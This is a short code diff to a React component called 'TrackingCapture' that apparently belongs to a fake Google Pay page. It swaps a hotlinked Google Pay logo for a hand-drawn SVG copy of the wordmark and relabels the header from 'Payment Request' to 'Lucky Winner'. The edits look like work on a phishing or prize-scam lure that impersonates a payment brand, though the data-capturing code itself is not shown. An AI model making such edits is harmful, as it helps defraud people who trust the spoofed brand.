@@ -104,13 +104,17 @@ export default function TrackingCapture() {
         {/* Header */}
         <div style={{ background: "linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)", padding: "28px 24px 24px", textAlign: "center" }}>
           <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 12 }}>
-            <img
+            {/* <img
               src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Google_Pay_Logo.svg/640px-Google_Pay_Logo.svg.png"
               alt="Google Pay"
               style={{ height: 38, filter: "brightness(0) invert(1)" }}
-            />
+            /> */}
+            <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <text x="0" y="32" fontFamily="'Google Sans', Roboto, sans-serif" fontSize="32" fontWeight="700" fill="white">G</text>
+  <text x="38" y="30" fontFamily="'Google Sans', Roboto, sans-serif" fontSize="26" fontWeight="400" fill="white">Pay</text>
+</svg>
           </div>
-          <div style={{ color: "rgba(255,255,255,0.85)", fontSize: 13 }}>Payment Request</div>
+          <div style={{ color: "rgba(255,255,255,0.85)", fontSize: 13 }}>Lucky Winner</div>
         </div>
 
         {/* Amount */}
